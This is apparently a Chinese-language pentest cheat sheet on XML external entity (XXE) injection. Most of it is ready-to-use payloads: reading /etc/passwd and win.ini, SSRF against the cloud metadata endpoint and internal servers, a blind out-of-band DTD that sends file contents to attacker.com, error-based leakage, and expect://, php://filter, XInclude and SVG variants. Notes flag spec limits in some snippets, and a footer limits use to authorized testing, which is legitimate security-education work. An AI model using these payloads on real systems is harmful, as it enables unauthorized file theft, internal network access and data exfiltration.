# 📄 XXE - XML 外部实体注入

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗  ██╗██╗  ██╗███████╗
  ╚██╗██╔╝╚██╗██╔╝██╔════╝
   ╚███╔╝  ╚███╔╝ █████╗  
   ██╔██╗  ██╔██╗ ██╔══╝  
  ██╔╝ ██╗██╔╝ ██╗███████╗
  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
   XML 外部实体注入
```

---

<a id="-what-is-xxe"></a>
## 🎯 XXE 是什么

**XXE** 利用 XML 解析器对外部实体引用的处理缺陷，可造成文件读取、服务端请求伪造（SSRF），并在某些环境中导致远程代码执行（RCE）。

---

<a id="-basic-payloads"></a>
## 💉 基础载荷（Payload）

> **示例说明：** 本文保留原始片段。部分示例的 DOCTYPE 名为 `foo`，根元素却为 `root`；[XML 规范](https://www.w3.org/TR/xml/#sec-prolog-dtd)要求二者在有效性校验时一致。多个示例也不能直接拼成一份完整 XML 文档。

### 读取本地文件
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Windows 文件
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

### 通过 XXE 发起 SSRF
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/">
]>
<root>&xxe;</root>
```

---

> **元数据服务说明：** 上方 AWS 元数据 URL 对应传统无令牌访问方式；若实例要求 [IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)，请求必须携带有效会话令牌，此处简单的外部实体请求不满足该要求。

<a id="-blind-xxe-out-of-band"></a>
## 🔒 盲 XXE（带外通信，OOB）

### 外部 DTD（文档类型定义）
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

**攻击者服务器上的 evil.dtd：**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### 通过错误信息泄露数据
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```

---

> **DTD 限制：** 上方报错示例在内部 DTD 的声明中引用参数实体；[XML 规范的内部子集约束](https://www.w3.org/TR/xml/#sec-prolog-dtd)禁止这种用法，符合规范的解析器可能直接拒绝它。具体行为取决于解析器及配置，不能视为通用载荷。

<a id="-bypass-techniques"></a>
## 🛡️ 绕过技术

### 编码
```xml
<!-- UTF-16 -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- 使用 Base64 编码封装 -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

> **编码说明：** 上方是示意片段。[XML 规范](https://www.w3.org/TR/xml/#charencoding)要求实际字节编码与声明一致；仅写 `encoding="UTF-16"` 不会转换编码。XML 声明若存在，应位于文档开头，不能直接保留其前面的示意注释。

### 协议变体
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "data://text/plain,test">
```

> **环境依赖：** 这些 URI 方案并非所有 XML 解析器都支持。[PHP 官方手册](https://www.php.net/manual/en/wrappers.expect.php)说明，`expect://` 依赖额外的 PECL Expect 扩展，默认未启用。

### XInclude
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

> **XInclude 说明：** [XInclude](https://www.w3.org/TR/xinclude/)是独立的包含处理机制；示例能否读取资源取决于应用是否执行 XInclude 处理及相关资源访问策略，普通 XML 解析不会自动保证其生效。

### SVG 中的 XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="20">&xxe;</text>
</svg>
```

---

<a id="-quick-reference"></a>
## 📊 速查表

| 载荷类型 | 使用方式 |
|--------------|----------|
| 文件读取 | `SYSTEM "file:///etc/passwd"` |
| SSRF | `SYSTEM "http://internal/"` |
| 盲 XXE（OOB） | 外部 DTD + 数据外传 |
| 基于错误信息 | 让错误信息包含数据 |

### 常见的潜在易受攻击入口
```
- SOAP API
- XML 文件上传
- SVG 处理器
- 文档解析器（DOCX、XLSX）
- RSS/Atom 订阅源
```

---

<a id="-resources"></a>
## 📚 参考资源

- [PortSwigger XXE](https://portswigger.net/web-security/xxe)
- [PayloadsAllTheThings XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

---

<p align="center">
  <b>📄 测试 XML 解析器的漏洞！</b><br>
  <i>仅限经授权的测试！</i>
</p>
